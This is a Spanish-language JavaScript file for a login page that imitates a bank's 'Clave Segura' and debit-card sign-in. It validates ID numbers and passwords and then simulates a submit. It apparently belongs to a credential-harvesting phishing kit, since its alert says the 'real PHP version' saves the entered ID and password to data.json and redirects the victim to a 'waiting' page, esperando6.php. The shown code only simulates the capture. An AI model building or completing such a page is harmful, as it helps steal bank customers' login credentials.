// Funcionalidad de pestañas
document.addEventListener('DOMContentLoaded', function() {
    const tabClaveSegura = document.getElementById('tab-clave-segura');
    const tabTarjetaDebito = document.getElementById('tab-tarjeta-debito');
    const alertMessage = document.getElementById('alert-message');

    // Manejar clic en pestaña Clave Segura
    tabClaveSegura.addEventListener('click', function() {
        tabClaveSegura.classList.add('active');
        tabTarjetaDebito.classList.remove('active');
        alertMessage.style.display = 'block';
        updateAlertMessage('Estás ingresando con tu Clave Segura. Selecciona Tarjeta Débito para cambiar el tipo de ingreso.');
    });

    // Manejar clic en pestaña Tarjeta Débito
    tabTarjetaDebito.addEventListener('click', function() {
        tabTarjetaDebito.classList.add('active');
        tabClaveSegura.classList.remove('active');
        alertMessage.style.display = 'block';
        updateAlertMessage('Estás ingresando con tu Tarjeta Débito. Selecciona Clave Segura para cambiar el tipo de ingreso.');
    });

    // Validar formulario
    const form = document.querySelector('.login-form');
    const submitBtn = document.querySelector('.submit-btn');
    const inputs = form.querySelectorAll('input[required]');

    function validateForm() {
        let allValid = true;
        inputs.forEach(input => {
            if (!input.value.trim()) {
                allValid = false;
            }
        });

        if (allValid) {
            submitBtn.style.backgroundColor = '#1976d2';
            submitBtn.style.color = 'white';
            submitBtn.disabled = false;
        } else {
            submitBtn.style.backgroundColor = '#e0e0e0';
            submitBtn.style.color = '#999';
            submitBtn.disabled = true;
        }
    }

    // Validar en tiempo real
    inputs.forEach(input => {
        input.addEventListener('input', validateForm);
        input.addEventListener('blur', validateForm);
    });

    // Validación inicial
    validateForm();
});

// Función para mostrar/ocultar contraseña
function togglePassword() {
    const passwordInput = document.querySelector('.password-input');
    const eyeIcon = document.querySelector('.eye-icon');

    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIcon.innerHTML = `
            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
            <line x1="1" y1="1" x2="23" y2="23"></line>
        `;
    } else {
        passwordInput.type = 'password';
        eyeIcon.innerHTML = `
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
            <circle cx="12" cy="12" r="3"></circle>
        `;
    }
}

// Función para cerrar alerta
function closeAlert() {
    const alertMessage = document.getElementById('alert-message');
    alertMessage.style.display = 'none';
}

// Función para actualizar mensaje de alerta
function updateAlertMessage(message) {
    const alertMessage = document.getElementById('alert-message');
    const alertText = alertMessage.querySelector('span');
    alertText.textContent = message;
}

// Validación del número de identificación
document.querySelector('.id-number-input').addEventListener('input', function(e) {
    // Solo permitir números
    this.value = this.value.replace(/[^0-9]/g, '');

    // Limitar longitud según el tipo de documento
    const tipoDoc = document.querySelector('.id-type-select').value;
    let maxLength = 10;

    switch(tipoDoc) {
        case 'CC':
        case 'CE':
            maxLength = 10;
            break;
        case 'TI':
            maxLength = 11;
            break;
        case 'PP':
            maxLength = 12;
            break;
    }

    if (this.value.length > maxLength) {
        this.value = this.value.substring(0, maxLength);
    }
});

// Validación de la clave segura
document.querySelector('.password-input').addEventListener('input', function(e) {
    // Limitar a 8 caracteres para clave segura
    if (this.value.length > 8) {
        this.value = this.value.substring(0, 8);
    }
});

// Simular login con la nueva lógica
document.getElementById('login-form').addEventListener('submit', function(e) {
    e.preventDefault();

    const tipoId = document.querySelector('.id-type-select').value;
    const numeroId = document.querySelector('.id-number-input').value;
    const clave = document.querySelector('.password-input').value;
    const errorMessages = document.getElementById('error-messages');
    const errorMessage = document.getElementById('error-message');

    // Limpiar errores previos
    errorMessages.style.display = 'none';

    // Validaciones
    if (!numeroId || !clave) {
        errorMessage.textContent = '⚠️ Por favor completa todos los campos';
        errorMessages.style.display = 'block';
        return;
    }

    if (!/^[0-9]+$/.test(numeroId)) {
        errorMessage.textContent = '⚠️ El número de identificación solo debe contener números';
        errorMessages.style.display = 'block';
        return;
    }

    if (clave.length < 4 || clave.length > 8) {
        errorMessage.textContent = '⚠️ La clave debe tener entre 4 y 8 caracteres';
        errorMessages.style.display = 'block';
        return;
    }

    // Simular el procesamiento
    const submitBtn = document.querySelector('.submit-btn');
    const originalText = submitBtn.textContent;

    submitBtn.textContent = 'Procesando...';
    submitBtn.disabled = true;

    setTimeout(() => {
        // Simular datos almacenados
        const userData = {
            user: tipoId + '-' + numeroId,
            tipo_identificacion: tipoId,
            numero_identificacion: numeroId,
            clave_cifrada: 'simulado_' + btoa(clave),
            estado: 'esperando',
            entidad: 'persona',
            fecha: new Date().toLocaleString('es-ES'),
            ip: '192.168.1.100'
        };

        // Mostrar resultado
        alert(`✅ ¡Datos procesados exitosamente!\n\n` +
              `Usuario: ${userData.user}\n` +
              `Estado: ${userData.estado}\n` +
              `Fecha: ${userData.fecha}\n\n` +
              `En la versión PHP real, estos datos se guardarían encriptados en data.json ` +
              `y serías redirigido a esperando6.php`);

        submitBtn.textContent = originalText;
        submitBtn.disabled = false;

    }, 2000);
});

// Mostrar página de registro (simulación)
function showRegistro() {
    alert('📝 Página de Registro\n\nPara registrarte debes acercarte a una sucursal con:\n• Documento de identidad\n• Comprobante de ingresos\n• Comprobante de domicilio\n\nO llama al: 01-8000-123-456');
}

// Mostrar página de recuperación (simulación)
function showRecuperar() {
    const email = prompt('📧 Recuperar Clave\n\nIngresa tu correo electrónico:');
    if (email) {
        alert('✅ Hemos enviado las instrucciones de recuperación a: ' + email);
    }
}